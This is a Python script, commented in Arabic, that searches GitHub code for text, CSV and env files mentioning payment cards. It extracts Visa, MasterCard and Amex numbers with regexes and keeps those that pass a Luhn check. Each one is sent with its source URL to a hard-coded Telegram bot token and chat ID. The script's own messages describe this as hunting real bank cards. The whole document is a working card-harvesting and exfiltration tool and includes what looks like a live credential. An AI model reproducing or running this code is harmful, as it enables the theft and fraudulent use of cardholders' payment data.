import sys, re, time, random, requests
from datetime import datetime

TELEGRAM_TOKEN = "8914882875:AAGmoUu_Ckl16HA0wrcM6YICNz1ZH_WphCQ"
TELEGRAM_CHAT_ID = "6306556778"
TOTAL_RUN_DURATION = 5 * 60 * 60

# أنماط أرقام البطاقات البنكية فقط (أرقام صرفة)
CARD_PATTERNS = {
    'Visa': r'\b4[0-9]{12}(?:[0-9]{3})?\b',
    'MasterCard': r'\b5[1-5][0-9]{14}\b',
    'Amex': r'\b3[47][0-9]{13}\b'
}

def send_to_telegram(text):
    try:
        requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage', 
                      json={'chat_id': TELEGRAM_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'}, timeout=10)
    except: pass

def luhn_check(card):
    digits = [int(d) for d in str(card)]
    odd = digits[-1::-2]; even = digits[-2::-2]
    checksum = sum(odd) + sum(sum(divmod(d*2, 10)) for d in even)
    return checksum % 10 == 0

def search_github():
    found = {}
    for query in ['"visa" extension:txt', '"mastercard" extension:csv', '"card number" extension:env']:
        try:
            resp = requests.get(f"https://api.github.com/search/code?q={query}&per_page=10", 
                                headers={'Accept': 'application/vnd.github.v3+json'}, timeout=20)
            if resp.status_code == 200:
                for item in resp.json().get('items', []):
                    raw = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        text = requests.get(raw, timeout=10).text
                        for ctype, pattern in CARD_PATTERNS.items():
                            for match in re.findall(pattern, text):
                                if len(match) >= 13:
                                    found[match] = (ctype, raw)
                    except: pass
        except: pass
        time.sleep(1)
    return found

def main():
    send_to_telegram("🔥 *بدء صيد البطاقات البنكية الحقيقية (أرقام فقط)* 🔥\n✅ سيتم إرسال الأرقام التي تجتاز فحص Luhn فقط.")
    start = time.time(); valid=0; scanned=0; processed=set()
    while time.time() - start < TOTAL_RUN_DURATION:
        cards = search_github()
        for num, (ctype, url) in cards.items():
            if num in processed: continue
            processed.add(num); scanned += 1
            if luhn_check(num):
                valid += 1
                send_to_telegram(f"💳 *بطاقة صالحة (Luhn)*\nالنوع: {ctype}\nالرقم: `{num}`\nالمصدر: {url}\n🕒 {datetime.utcnow()}")
        time.sleep(60)
    send_to_telegram(f"📊 *تقرير نهائي*\nفحص: {scanned}\nالصالح: {valid}")

if __name__ == "__main__": main()
